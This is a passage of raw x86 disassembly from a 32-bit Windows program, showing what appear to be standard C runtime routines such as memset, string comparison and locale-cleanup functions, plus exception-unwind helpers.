  4278eb:	call   0x427b90
  4278f0:	add    esp,0xc
  4278f3:	jmp    0x427905
  4278f5:	xor    eax,eax
  4278f7:	inc    eax
  4278f8:	ret    
  4278f9:	mov    esp,DWORD PTR [ebp-0x18]
  4278fc:	call   0x428725
  427901:	xor    ebx,ebx
  427903:	xor    edi,edi
  427905:	or     DWORD PTR [ebp-0x4],0xffffffff
  427909:	cmp    edi,ebx
  42790b:	jne    0x427930
  42790d:	push   DWORD PTR [ebp-0x40]
  427910:	call   0x425fb2
  427915:	pop    ecx
  427916:	mov    edi,eax
  427918:	cmp    edi,ebx
  42791a:	je     0x42794d
  42791c:	push   DWORD PTR [ebp-0x40]
  42791f:	push   ebx
  427920:	push   edi
  427921:	call   0x427b90
  427926:	add    esp,0xc
  427929:	mov    DWORD PTR [ebp-0x38],0x1
  427930:	push   DWORD PTR [ebp-0x40]
  427933:	push   edi
  427934:	push   DWORD PTR [ebp+0x14]
  427937:	push   DWORD PTR [ebp-0x34]
  42793a:	push   DWORD PTR [ebp+0xc]
  42793d:	push   DWORD PTR [ebp+0x8]
  427940:	call   DWORD PTR ds:0x429100
  427946:	mov    DWORD PTR [ebp-0x40],eax
  427949:	cmp    eax,ebx
  42794b:	jne    0x427951
  42794d:	xor    esi,esi
  42794f:	jmp    0x427977
  427951:	push   DWORD PTR [ebp+0x1c]
  427954:	push   DWORD PTR [ebp+0x18]
  427957:	lea    eax,[ebp-0x40]
  42795a:	push   eax
  42795b:	push   edi
  42795c:	push   DWORD PTR [ebp+0x20]
  42795f:	push   DWORD PTR [ebp-0x3c]
  427962:	call   0x428556
  427967:	add    esp,0x18
  42796a:	mov    esi,eax
  42796c:	neg    esi
  42796e:	sbb    esi,esi
  427970:	neg    esi
  427972:	jmp    0x427977
  427974:	mov    esi,DWORD PTR [ebp-0x48]
  427977:	cmp    DWORD PTR [ebp-0x38],ebx
  42797a:	je     0x42799f
  42797c:	push   edi
  42797d:	call   0x425e9a
  427982:	pop    ecx
  427983:	jmp    0x42799f
  427985:	push   DWORD PTR [ebp+0x1c]
  427988:	push   DWORD PTR [ebp+0x18]
  42798b:	push   DWORD PTR [ebp+0x14]
  42798e:	push   DWORD PTR [ebp+0x10]
  427991:	push   DWORD PTR [ebp+0xc]
  427994:	push   DWORD PTR [ebp+0x8]
  427997:	call   DWORD PTR ds:0x429100
  42799d:	mov    esi,eax
  42799f:	cmp    DWORD PTR [ebp-0x34],ebx
  4279a2:	je     0x4279ad
  4279a4:	push   DWORD PTR [ebp-0x34]
  4279a7:	call   0x425e9a
  4279ac:	pop    ecx
  4279ad:	mov    eax,esi
  4279af:	lea    esp,[ebp-0x54]
  4279b2:	call   0x4252cb
  4279b7:	ret    
  4279b8:	push   0x1c
  4279ba:	push   0x429dd0
  4279bf:	call   0x425290
  4279c4:	xor    esi,esi
  4279c6:	cmp    DWORD PTR ds:0x467380,esi
  4279cc:	jne    0x427a03
  4279ce:	lea    eax,[ebp-0x1c]
  4279d1:	push   eax
  4279d2:	xor    edi,edi
  4279d4:	inc    edi
  4279d5:	push   edi
  4279d6:	push   0x429da4
  4279db:	push   edi
  4279dc:	call   DWORD PTR ds:0x429110
  4279e2:	test   eax,eax
  4279e4:	je     0x4279ee
  4279e6:	mov    DWORD PTR ds:0x467380,edi
  4279ec:	jmp    0x427a03
  4279ee:	call   DWORD PTR ds:0x429034
  4279f4:	cmp    eax,0x78
  4279f7:	jne    0x427a03
  4279f9:	mov    DWORD PTR ds:0x467380,0x2
  427a03:	mov    eax,ds:0x467380
  427a08:	cmp    eax,0x2
  427a0b:	je     0x427afb
  427a11:	cmp    eax,esi
  427a13:	je     0x427afb
  427a19:	cmp    eax,0x1
  427a1c:	jne    0x427b21
  427a22:	mov    DWORD PTR [ebp-0x20],esi
  427a25:	mov    DWORD PTR [ebp-0x24],esi
  427a28:	cmp    DWORD PTR [ebp+0x18],esi
  427a2b:	jne    0x427a35
  427a2d:	mov    eax,ds:0x467374
  427a32:	mov    DWORD PTR [ebp+0x18],eax
  427a35:	push   esi
  427a36:	push   esi
  427a37:	push   DWORD PTR [ebp+0x10]
  427a3a:	push   DWORD PTR [ebp+0xc]
  427a3d:	xor    eax,eax
  427a3f:	cmp    DWORD PTR [ebp+0x20],esi
  427a42:	setne  al
  427a45:	lea    eax,[eax*8+0x1]
  427a4c:	push   eax
  427a4d:	push   DWORD PTR [ebp+0x18]
  427a50:	call   DWORD PTR ds:0x429104
  427a56:	mov    edi,eax
  427a58:	mov    DWORD PTR [ebp-0x28],edi
  427a5b:	test   edi,edi
  427a5d:	je     0x427b21
  427a63:	and    DWORD PTR [ebp-0x4],0x0
  427a67:	lea    ebx,[edi+edi*1]
  427a6a:	mov    eax,ebx
  427a6c:	add    eax,0x3
  427a6f:	and    eax,0xfffffffc
  427a72:	call   0x4252e0
  427a77:	mov    DWORD PTR [ebp-0x18],esp
  427a7a:	mov    esi,esp
  427a7c:	mov    DWORD PTR [ebp-0x2c],esi
  427a7f:	push   ebx
  427a80:	push   0x0
  427a82:	push   esi
  427a83:	call   0x427b90
  427a88:	add    esp,0xc
  427a8b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427a8f:	jmp    0x427aa6
  427a91:	xor    eax,eax
  427a93:	inc    eax
  427a94:	ret    
  427a95:	mov    esp,DWORD PTR [ebp-0x18]
  427a98:	call   0x428725
  427a9d:	xor    esi,esi
  427a9f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa3:	mov    edi,DWORD PTR [ebp-0x28]
  427aa6:	test   esi,esi
  427aa8:	jne    0x427ac1
  427aaa:	push   edi
  427aab:	push   0x2
  427aad:	call   0x4263a8
  427ab2:	pop    ecx
  427ab3:	pop    ecx
  427ab4:	mov    esi,eax
  427ab6:	test   esi,esi
  427ab8:	je     0x427b21
  427aba:	mov    DWORD PTR [ebp-0x24],0x1
  427ac1:	push   edi
  427ac2:	push   esi
  427ac3:	push   DWORD PTR [ebp+0x10]
  427ac6:	push   DWORD PTR [ebp+0xc]
  427ac9:	push   0x1
  427acb:	push   DWORD PTR [ebp+0x18]
  427ace:	call   DWORD PTR ds:0x429104
  427ad4:	test   eax,eax
  427ad6:	je     0x427ae9
  427ad8:	push   DWORD PTR [ebp+0x14]
  427adb:	push   eax
  427adc:	push   esi
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429110
  427ae6:	mov    DWORD PTR [ebp-0x20],eax
  427ae9:	cmp    DWORD PTR [ebp-0x24],0x0
  427aed:	je     0x427af6
  427aef:	push   esi
  427af0:	call   0x425e9a
  427af5:	pop    ecx
  427af6:	mov    eax,DWORD PTR [ebp-0x20]
  427af9:	jmp    0x427b69
  427afb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427afe:	cmp    ebx,esi
  427b00:	jne    0x427b08
  427b02:	mov    ebx,DWORD PTR ds:0x467364
  427b08:	mov    edi,DWORD PTR [ebp+0x18]
  427b0b:	test   edi,edi
  427b0d:	jne    0x427b15
  427b0f:	mov    edi,DWORD PTR ds:0x467374
  427b15:	push   ebx
  427b16:	call   0x42850d
  427b1b:	pop    ecx
  427b1c:	cmp    eax,0xffffffff
  427b1f:	jne    0x427b25
  427b21:	xor    eax,eax
  427b23:	jmp    0x427b69
  427b25:	cmp    eax,edi
  427b27:	je     0x427b47
  427b29:	push   0x0
  427b2b:	push   0x0
  427b2d:	lea    ecx,[ebp+0x10]
  427b30:	push   ecx
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   eax
  427b35:	push   edi
  427b36:	call   0x428556
  427b3b:	add    esp,0x18
  427b3e:	mov    esi,eax
  427b40:	test   esi,esi
  427b42:	je     0x427b21
  427b44:	mov    DWORD PTR [ebp+0xc],esi
  427b47:	push   DWORD PTR [ebp+0x14]
  427b4a:	push   DWORD PTR [ebp+0x10]
  427b4d:	push   DWORD PTR [ebp+0xc]
  427b50:	push   DWORD PTR [ebp+0x8]
  427b53:	push   ebx
  427b54:	call   DWORD PTR ds:0x42910c
  427b5a:	mov    edi,eax
  427b5c:	test   esi,esi
  427b5e:	je     0x427b67
  427b60:	push   esi
  427b61:	call   0x425e9a
  427b66:	pop    ecx
  427b67:	mov    eax,edi
  427b69:	lea    esp,[ebp-0x38]
  427b6c:	call   0x4252cb
  427b71:	ret    
  427b72:	mov    eax,ds:0x467384
  427b77:	test   eax,eax
  427b79:	je     0x427b8a
  427b7b:	push   DWORD PTR [esp+0x4]
  427b7f:	call   eax
  427b81:	test   eax,eax
  427b83:	pop    ecx
  427b84:	je     0x427b8a
  427b86:	xor    eax,eax
  427b88:	inc    eax
  427b89:	ret    
  427b8a:	xor    eax,eax
  427b8c:	ret    
  427b8d:	int3   
  427b8e:	int3   
  427b8f:	int3   
  427b90:	mov    edx,DWORD PTR [esp+0xc]
  427b94:	mov    ecx,DWORD PTR [esp+0x4]
  427b98:	test   edx,edx
  427b9a:	je     0x427beb
  427b9c:	xor    eax,eax
  427b9e:	mov    al,BYTE PTR [esp+0x8]
  427ba2:	push   edi
  427ba3:	mov    edi,ecx
  427ba5:	cmp    edx,0x4
  427ba8:	jb     0x427bdb
  427baa:	neg    ecx
  427bac:	and    ecx,0x3
  427baf:	je     0x427bbd
  427bb1:	sub    edx,ecx
  427bb3:	mov    BYTE PTR [edi],al
  427bb5:	add    edi,0x1
  427bb8:	sub    ecx,0x1
  427bbb:	jne    0x427bb3
  427bbd:	mov    ecx,eax
  427bbf:	shl    eax,0x8
  427bc2:	add    eax,ecx
  427bc4:	mov    ecx,eax
  427bc6:	shl    eax,0x10
  427bc9:	add    eax,ecx
  427bcb:	mov    ecx,edx
  427bcd:	and    edx,0x3
  427bd0:	shr    ecx,0x2
  427bd3:	je     0x427bdb
  427bd5:	rep stos DWORD PTR es:[edi],eax
  427bd7:	test   edx,edx
  427bd9:	je     0x427be5
  427bdb:	mov    BYTE PTR [edi],al
  427bdd:	add    edi,0x1
  427be0:	sub    edx,0x1
  427be3:	jne    0x427bdb
  427be5:	mov    eax,DWORD PTR [esp+0x8]
  427be9:	pop    edi
  427bea:	ret    
  427beb:	mov    eax,DWORD PTR [esp+0x4]
  427bef:	ret    
  427bf0:	push   esi
  427bf1:	mov    esi,DWORD PTR [esp+0x8]
  427bf5:	test   esi,esi
  427bf7:	je     0x427d7e
  427bfd:	push   DWORD PTR [esi+0x4]
  427c00:	call   0x425e9a
  427c05:	push   DWORD PTR [esi+0x8]
  427c08:	call   0x425e9a
  427c0d:	push   DWORD PTR [esi+0xc]
  427c10:	call   0x425e9a
  427c15:	push   DWORD PTR [esi+0x10]
  427c18:	call   0x425e9a
  427c1d:	push   DWORD PTR [esi+0x14]
  427c20:	call   0x425e9a
  427c25:	push   DWORD PTR [esi+0x18]
  427c28:	call   0x425e9a
  427c2d:	push   DWORD PTR [esi]
  427c2f:	call   0x425e9a
  427c34:	push   DWORD PTR [esi+0x20]
  427c37:	call   0x425e9a
  427c3c:	push   DWORD PTR [esi+0x24]
  427c3f:	call   0x425e9a
  427c44:	push   DWORD PTR [esi+0x28]
  427c47:	call   0x425e9a
  427c4c:	push   DWORD PTR [esi+0x2c]
  427c4f:	call   0x425e9a
  427c54:	push   DWORD PTR [esi+0x30]
  427c57:	call   0x425e9a
  427c5c:	push   DWORD PTR [esi+0x34]
  427c5f:	call   0x425e9a
  427c64:	push   DWORD PTR [esi+0x1c]
  427c67:	call   0x425e9a
  427c6c:	push   DWORD PTR [esi+0x38]
  427c6f:	call   0x425e9a
  427c74:	push   DWORD PTR [esi+0x3c]
  427c77:	call   0x425e9a
  427c7c:	add    esp,0x40
  427c7f:	push   DWORD PTR [esi+0x40]
  427c82:	call   0x425e9a
  427c87:	push   DWORD PTR [esi+0x44]
  427c8a:	call   0x425e9a
  427c8f:	push   DWORD PTR [esi+0x48]
  427c92:	call   0x425e9a
  427c97:	push   DWORD PTR [esi+0x4c]
  427c9a:	call   0x425e9a
  427c9f:	push   DWORD PTR [esi+0x50]
  427ca2:	call   0x425e9a
  427ca7:	push   DWORD PTR [esi+0x54]
  427caa:	call   0x425e9a
  427caf:	push   DWORD PTR [esi+0x58]
  427cb2:	call   0x425e9a
  427cb7:	push   DWORD PTR [esi+0x5c]
  427cba:	call   0x425e9a
  427cbf:	push   DWORD PTR [esi+0x60]
  427cc2:	call   0x425e9a
  427cc7:	push   DWORD PTR [esi+0x64]
  427cca:	call   0x425e9a
  427ccf:	push   DWORD PTR [esi+0x68]
  427cd2:	call   0x425e9a
  427cd7:	push   DWORD PTR [esi+0x6c]
  427cda:	call   0x425e9a
  427cdf:	push   DWORD PTR [esi+0x70]
  427ce2:	call   0x425e9a
  427ce7:	push   DWORD PTR [esi+0x74]
  427cea:	call   0x425e9a
  427cef:	push   DWORD PTR [esi+0x78]
  427cf2:	call   0x425e9a
  427cf7:	push   DWORD PTR [esi+0x7c]
  427cfa:	call   0x425e9a
  427cff:	add    esp,0x40
  427d02:	push   DWORD PTR [esi+0x80]
  427d08:	call   0x425e9a
  427d0d:	push   DWORD PTR [esi+0x84]
  427d13:	call   0x425e9a
  427d18:	push   DWORD PTR [esi+0x88]
  427d1e:	call   0x425e9a
  427d23:	push   DWORD PTR [esi+0x8c]
  427d29:	call   0x425e9a
  427d2e:	push   DWORD PTR [esi+0x90]
  427d34:	call   0x425e9a
  427d39:	push   DWORD PTR [esi+0x94]
  427d3f:	call   0x425e9a
  427d44:	push   DWORD PTR [esi+0x98]
  427d4a:	call   0x425e9a
  427d4f:	push   DWORD PTR [esi+0x9c]
  427d55:	call   0x425e9a
  427d5a:	push   DWORD PTR [esi+0xa0]
  427d60:	call   0x425e9a
  427d65:	push   DWORD PTR [esi+0xa4]
  427d6b:	call   0x425e9a
  427d70:	push   DWORD PTR [esi+0xa8]
  427d76:	call   0x425e9a
  427d7b:	add    esp,0x2c
  427d7e:	pop    esi
  427d7f:	ret    
  427d80:	push   esi
  427d81:	mov    esi,DWORD PTR [esp+0x8]
  427d85:	test   esi,esi
  427d87:	je     0x427ddd
  427d89:	mov    eax,DWORD PTR [esi]
  427d8b:	mov    ecx,DWORD PTR ds:0x466ef4
  427d91:	cmp    eax,DWORD PTR [ecx]
  427d93:	je     0x427da4
  427d95:	cmp    eax,DWORD PTR ds:0x466ec4
  427d9b:	je     0x427da4
  427d9d:	push   eax
  427d9e:	call   0x425e9a
  427da3:	pop    ecx
  427da4:	mov    eax,DWORD PTR [esi+0x4]
  427da7:	mov    ecx,DWORD PTR ds:0x466ef4
  427dad:	cmp    eax,DWORD PTR [ecx+0x4]
  427db0:	je     0x427dc1
  427db2:	cmp    eax,DWORD PTR ds:0x466ec8
  427db8:	je     0x427dc1
  427dba:	push   eax
  427dbb:	call   0x425e9a
  427dc0:	pop    ecx
  427dc1:	mov    esi,DWORD PTR [esi+0x8]
  427dc4:	mov    eax,ds:0x466ef4
  427dc9:	cmp    esi,DWORD PTR [eax+0x8]
  427dcc:	je     0x427ddd
  427dce:	cmp    esi,DWORD PTR ds:0x466ecc
  427dd4:	je     0x427ddd
  427dd6:	push   esi
  427dd7:	call   0x425e9a
  427ddc:	pop    ecx
  427ddd:	pop    esi
  427dde:	ret    
  427ddf:	push   esi
  427de0:	mov    esi,DWORD PTR [esp+0x8]
  427de4:	test   esi,esi
  427de6:	je     0x427eb6
  427dec:	mov    eax,DWORD PTR [esi+0xc]
  427def:	mov    ecx,DWORD PTR ds:0x466ef4
  427df5:	cmp    eax,DWORD PTR [ecx+0xc]
  427df8:	je     0x427e09
  427dfa:	cmp    eax,DWORD PTR ds:0x466ed0
  427e00:	je     0x427e09
  427e02:	push   eax
  427e03:	call   0x425e9a
  427e08:	pop    ecx
  427e09:	mov    eax,DWORD PTR [esi+0x10]
  427e0c:	mov    ecx,DWORD PTR ds:0x466ef4
  427e12:	cmp    eax,DWORD PTR [ecx+0x10]
  427e15:	je     0x427e26
  427e17:	cmp    eax,DWORD PTR ds:0x466ed4
  427e1d:	je     0x427e26
  427e1f:	push   eax
  427e20:	call   0x425e9a
  427e25:	pop    ecx
  427e26:	mov    eax,DWORD PTR [esi+0x14]
  427e29:	mov    ecx,DWORD PTR ds:0x466ef4
  427e2f:	cmp    eax,DWORD PTR [ecx+0x14]
  427e32:	je     0x427e43
  427e34:	cmp    eax,DWORD PTR ds:0x466ed8
  427e3a:	je     0x427e43
  427e3c:	push   eax
  427e3d:	call   0x425e9a
  427e42:	pop    ecx
  427e43:	mov    eax,DWORD PTR [esi+0x18]
  427e46:	mov    ecx,DWORD PTR ds:0x466ef4
  427e4c:	cmp    eax,DWORD PTR [ecx+0x18]
  427e4f:	je     0x427e60
  427e51:	cmp    eax,DWORD PTR ds:0x466edc
  427e57:	je     0x427e60
  427e59:	push   eax
  427e5a:	call   0x425e9a
  427e5f:	pop    ecx
  427e60:	mov    eax,DWORD PTR [esi+0x1c]
  427e63:	mov    ecx,DWORD PTR ds:0x466ef4
  427e69:	cmp    eax,DWORD PTR [ecx+0x1c]
  427e6c:	je     0x427e7d
  427e6e:	cmp    eax,DWORD PTR ds:0x466ee0
  427e74:	je     0x427e7d
  427e76:	push   eax
  427e77:	call   0x425e9a
  427e7c:	pop    ecx
  427e7d:	mov    eax,DWORD PTR [esi+0x20]
  427e80:	mov    ecx,DWORD PTR ds:0x466ef4
  427e86:	cmp    eax,DWORD PTR [ecx+0x20]
  427e89:	je     0x427e9a
  427e8b:	cmp    eax,DWORD PTR ds:0x466ee4
  427e91:	je     0x427e9a
  427e93:	push   eax
  427e94:	call   0x425e9a
  427e99:	pop    ecx
  427e9a:	mov    esi,DWORD PTR [esi+0x24]
  427e9d:	mov    eax,ds:0x466ef4
  427ea2:	cmp    esi,DWORD PTR [eax+0x24]
  427ea5:	je     0x427eb6
  427ea7:	cmp    esi,DWORD PTR ds:0x466ee8
  427ead:	je     0x427eb6
  427eaf:	push   esi
  427eb0:	call   0x425e9a
  427eb5:	pop    ecx
  427eb6:	pop    esi
  427eb7:	ret    
  427eb8:	int3   
  427eb9:	int3   
  427eba:	int3   
  427ebb:	int3   
  427ebc:	int3   
  427ebd:	int3   
  427ebe:	int3   
  427ebf:	int3   
  427ec0:	push   ebp
  427ec1:	mov    ebp,esp
  427ec3:	push   esi
  427ec4:	xor    eax,eax
  427ec6:	push   eax
  427ec7:	push   eax
  427ec8:	push   eax
  427ec9:	push   eax
  427eca:	push   eax
  427ecb:	push   eax
  427ecc:	push   eax
  427ecd:	push   eax
  427ece:	mov    edx,DWORD PTR [ebp+0xc]
  427ed1:	lea    ecx,[ecx+0x0]
  427ed4:	mov    al,BYTE PTR [edx]
  427ed6:	or     al,al
  427ed8:	je     0x427ee3
  427eda:	add    edx,0x1
  427edd:	bts    DWORD PTR [esp],eax
  427ee1:	jmp    0x427ed4
  427ee3:	mov    esi,DWORD PTR [ebp+0x8]
  427ee6:	or     ecx,0xffffffff
  427ee9:	lea    ecx,[ecx+0x0]
  427eec:	add    ecx,0x1
  427eef:	mov    al,BYTE PTR [esi]
  427ef1:	or     al,al
  427ef3:	je     0x427efe
  427ef5:	add    esi,0x1
  427ef8:	bt     DWORD PTR [esp],eax
  427efc:	jae    0x427eec
  427efe:	mov    eax,ecx
  427f00:	add    esp,0x20
  427f03:	pop    esi
  427f04:	leave  
  427f05:	ret    
  427f06:	int3   
  427f07:	int3   
  427f08:	int3   
  427f09:	int3   
  427f0a:	int3   
  427f0b:	int3   
  427f0c:	int3   
  427f0d:	int3   
  427f0e:	int3   
  427f0f:	int3   
  427f10:	mov    edx,DWORD PTR [esp+0x4]
  427f14:	mov    ecx,DWORD PTR [esp+0x8]
  427f18:	test   edx,0x3
  427f1e:	jne    0x427f5c
  427f20:	mov    eax,DWORD PTR [edx]
  427f22:	cmp    al,BYTE PTR [ecx]
  427f24:	jne    0x427f54
  427f26:	or     al,al
  427f28:	je     0x427f50
  427f2a:	cmp    ah,BYTE PTR [ecx+0x1]
  427f2d:	jne    0x427f54
  427f2f:	or     ah,ah
  427f31:	je     0x427f50
  427f33:	shr    eax,0x10
  427f36:	cmp    al,BYTE PTR [ecx+0x2]
  427f39:	jne    0x427f54
  427f3b:	or     al,al
  427f3d:	je     0x427f50
  427f3f:	cmp    ah,BYTE PTR [ecx+0x3]
  427f42:	jne    0x427f54
  427f44:	add    ecx,0x4
  427f47:	add    edx,0x4
  427f4a:	or     ah,ah
  427f4c:	jne    0x427f20
  427f4e:	mov    edi,edi
  427f50:	xor    eax,eax
  427f52:	ret    
  427f53:	nop
  427f54:	sbb    eax,eax
  427f56:	shl    eax,1
  427f58:	add    eax,0x1
  427f5b:	ret    
  427f5c:	test   edx,0x1
  427f62:	je     0x427f7c
  427f64:	mov    al,BYTE PTR [edx]
  427f66:	add    edx,0x1
  427f69:	cmp    al,BYTE PTR [ecx]
  427f6b:	jne    0x427f54
  427f6d:	add    ecx,0x1
  427f70:	or     al,al
  427f72:	je     0x427f50
  427f74:	test   edx,0x2
  427f7a:	je     0x427f20
  427f7c:	mov    ax,WORD PTR [edx]
  427f7f:	add    edx,0x2
  427f82:	cmp    al,BYTE PTR [ecx]
  427f84:	jne    0x427f54
  427f86:	or     al,al
  427f88:	je     0x427f50
  427f8a:	cmp    ah,BYTE PTR [ecx+0x1]
  427f8d:	jne    0x427f54
  427f8f:	or     ah,ah
  427f91:	je     0x427f50
  427f93:	add    ecx,0x2
  427f96:	jmp    0x427f20
  427f98:	int3   
  427f99:	int3   
  427f9a:	int3   
  427f9b:	int3   
  427f9c:	int3   
  427f9d:	int3   
  427f9e:	int3   
  427f9f:	int3   
  427fa0:	mov    eax,DWORD PTR [esp+0xc]
  427fa4:	test   eax,eax
  427fa6:	je     0x427ff2
  427fa8:	mov    edx,DWORD PTR [esp+0x4]
  427fac:	push   esi
  427fad:	push   edi
  427fae:	mov    esi,edx
  427fb0:	mov    edi,DWORD PTR [esp+0x10]
  427fb4:	or     edx,edi
  427fb6:	and    edx,0x3
  427fb9:	je     0x427ff3
  427fbb:	test   eax,0x1
  427fc0:	je     0x427fd3
  427fc2:	mov    cl,BYTE PTR [esi]
  427fc4:	cmp    cl,BYTE PTR [edi]
  427fc6:	jne    0x428020
  427fc8:	add    esi,0x1
  427fcb:	add    edi,0x1
  427fce:	sub    eax,0x1
  427fd1:	je     0x427ff0
  427fd3:	mov    cl,BYTE PTR [esi]
  427fd5:	mov    dl,BYTE PTR [edi]
  427fd7:	cmp    cl,dl
  427fd9:	jne    0x428020
  427fdb:	mov    cl,BYTE PTR [esi+0x1]
  427fde:	mov    dl,BYTE PTR [edi+0x1]
  427fe1:	cmp    cl,dl
  427fe3:	jne    0x428020
  427fe5:	add    edi,0x2
  427fe8:	add    esi,0x2
  427feb:	sub    eax,0x2
  427fee:	jne    0x427fd3
  427ff0:	pop    edi
  427ff1:	pop    esi
  427ff2:	ret    
  427ff3:	mov    ecx,eax
  427ff5:	and    eax,0x3
  427ff8:	shr    ecx,0x2
  427ffb:	je     0x428028
  427ffd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fff:	je     0x428028
  428001:	mov    ecx,DWORD PTR [esi-0x4]
  428004:	mov    edx,DWORD PTR [edi-0x4]
  428007:	cmp    cl,dl
  428009:	jne    0x42801b
  42800b:	cmp    ch,dh
  42800d:	jne    0x42801b
  42800f:	shr    ecx,0x10
  428012:	shr    edx,0x10
  428015:	cmp    cl,dl
  428017:	jne    0x42801b
  428019:	cmp    ch,dh
  42801b:	mov    eax,0x0
  428020:	sbb    eax,eax
  428022:	pop    edi
  428023:	sbb    eax,0xffffffff
  428026:	pop    esi
  428027:	ret    
  428028:	test   eax,eax
  42802a:	je     0x427ff0
  42802c:	mov    edx,DWORD PTR [esi]
  42802e:	mov    ecx,DWORD PTR [edi]
  428030:	cmp    dl,cl
  428032:	jne    0x42801b
  428034:	sub    eax,0x1
  428037:	je     0x428055
  428039:	cmp    dh,ch
  42803b:	jne    0x42801b
  42803d:	sub    eax,0x1
  428040:	je     0x428055
  428042:	and    ecx,0xff0000
  428048:	and    edx,0xff0000
  42804e:	cmp    edx,ecx
  428050:	jne    0x42801b
  428052:	sub    eax,0x1
  428055:	pop    edi
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   edi
  428064:	push   esi
  428065:	push   ebx
  428066:	mov    ecx,DWORD PTR [ebp+0x10]
  428069:	jecxz  0x428092
  42806b:	mov    ebx,ecx
  42806d:	mov    edi,DWORD PTR [ebp+0x8]
  428070:	mov    esi,edi
  428072:	xor    eax,eax
  428074:	repnz scas al,BYTE PTR es:[edi]
  428076:	neg    ecx
  428078:	add    ecx,ebx
  42807a:	mov    edi,esi
  42807c:	mov    esi,DWORD PTR [ebp+0xc]
  42807f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428081:	mov    al,BYTE PTR [esi-0x1]
  428084:	xor    ecx,ecx
  428086:	cmp    al,BYTE PTR [edi-0x1]
  428089:	ja     0x428090
  42808b:	je     0x428092
  42808d:	sub    ecx,0x2
  428090:	not    ecx
  428092:	mov    eax,ecx
  428094:	pop    ebx
  428095:	pop    esi
  428096:	pop    edi
  428097:	leave  
  428098:	ret    
  428099:	int3   
  42809a:	int3   
  42809b:	int3   
  42809c:	int3   
  42809d:	int3   
  42809e:	int3   
  42809f:	int3   
  4280a0:	push   ebp
  4280a1:	mov    ebp,esp
  4280a3:	push   esi
  4280a4:	xor    eax,eax
  4280a6:	push   eax
  4280a7:	push   eax
  4280a8:	push   eax
  4280a9:	push   eax
  4280aa:	push   eax
  4280ab:	push   eax
  4280ac:	push   eax
  4280ad:	push   eax
  4280ae:	mov    edx,DWORD PTR [ebp+0xc]
  4280b1:	lea    ecx,[ecx+0x0]
  4280b4:	mov    al,BYTE PTR [edx]
  4280b6:	or     al,al
  4280b8:	je     0x4280c3
  4280ba:	add    edx,0x1
  4280bd:	bts    DWORD PTR [esp],eax
  4280c1:	jmp    0x4280b4
  4280c3:	mov    esi,DWORD PTR [ebp+0x8]
  4280c6:	mov    edi,edi
  4280c8:	mov    al,BYTE PTR [esi]
  4280ca:	or     al,al
  4280cc:	je     0x4280da
  4280ce:	add    esi,0x1
  4280d1:	bt     DWORD PTR [esp],eax
  4280d5:	jae    0x4280c8
  4280d7:	lea    eax,[esi-0x1]
  4280da:	add    esp,0x20
  4280dd:	pop    esi
  4280de:	leave  
  4280df:	ret    
  4280e0:	push   ebp
  4280e1:	mov    ebp,esp
  4280e3:	push   ebx
  4280e4:	push   esi
  4280e5:	push   edi
  4280e6:	push   ebp
  4280e7:	push   0x0
  4280e9:	push   0x0
  4280eb:	push   0x4280f8
  4280f0:	push   DWORD PTR [ebp+0x8]
  4280f3:	call   0x428b6e
  4280f8:	pop    ebp
  4280f9:	pop    edi
  4280fa:	pop    esi
  4280fb:	pop    ebx
  4280fc:	mov    esp,ebp
  4280fe:	pop    ebp
  4280ff:	ret    
  428100:	mov    ecx,DWORD PTR [esp+0x4]
  428104:	test   DWORD PTR [ecx+0x4],0x6
  42810b:	mov    eax,0x1
  428110:	je     0x428121
  428112:	mov    eax,DWORD PTR [esp+0x8]
  428116:	mov    edx,DWORD PTR [esp+0x10]
  42811a:	mov    DWORD PTR [edx],eax
  42811c:	mov    eax,0x3
  428121:	ret    
  428122:	push   ebx
  428123:	push   esi
  428124:	push   edi
  428125:	mov    eax,DWORD PTR [esp+0x10]
  428129:	push   eax
  42812a:	push   0xfffffffe
  42812c:	push   0x428100
  428131:	push   DWORD PTR fs:0x0
  428138:	mov    DWORD PTR fs:0x0,esp
  42813f:	mov    eax,DWORD PTR [esp+0x20]
  428143:	mov    ebx,DWORD PTR [eax+0x8]
  428146:	mov    esi,DWORD PTR [eax+0xc]
  428149:	cmp    esi,0xffffffff
  42814c:	je     0x42817c
  42814e:	cmp    esi,DWORD PTR [esp+0x24]
  428152:	je     0x42817c
  428154:	lea    esi,[esi+esi*2]
  428157:	mov    ecx,DWORD PTR [ebx+esi*4]
  42815a:	mov    DWORD PTR [esp+0x8],ecx
  42815e:	mov    DWORD PTR [eax+0xc],ecx
  428161:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428166:	jne    0x42817a
  428168:	push   0x101
  42816d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428171:	call   0x4281b6
  428176:	call   DWORD PTR [ebx+esi*4+0x8]
  42817a:	jmp    0x42813f
  42817c:	pop    DWORD PTR fs:0x0
  428183:	add    esp,0xc
  428186:	pop    edi
  428187:	pop    esi
  428188:	pop    ebx
  428189:	ret    
  42818a:	xor    eax,eax
  42818c:	mov    ecx,DWORD PTR fs:0x0
  428193:	cmp    DWORD PTR [ecx+0x4],0x428100
  42819a:	jne    0x4281ac
  42819c:	mov    edx,DWORD PTR [ecx+0xc]
  42819f:	mov    edx,DWORD PTR [edx+0xc]
  4281a2:	cmp    DWORD PTR [ecx+0x8],edx
  4281a5:	jne    0x4281ac
  4281a7:	mov    eax,0x1
  4281ac:	ret    
  4281ad:	push   ebx
  4281ae:	push   ecx
  4281af:	mov    ebx,0x466f0c
  4281b4:	jmp    0x4281c0
  4281b6:	push   ebx
  4281b7:	push   ecx
  4281b8:	mov    ebx,0x466f0c
  4281bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4281c0:	mov    DWORD PTR [ebx+0x8],ecx
  4281c3:	mov    DWORD PTR [ebx+0x4],eax
  4281c6:	mov    DWORD PTR [ebx+0xc],ebp
  4281c9:	pop    ecx
  4281ca:	pop    ebx
  4281cb:	ret    0x4
  4281ce:	int3   
  4281cf:	int3   
  4281d0:	push   ebp
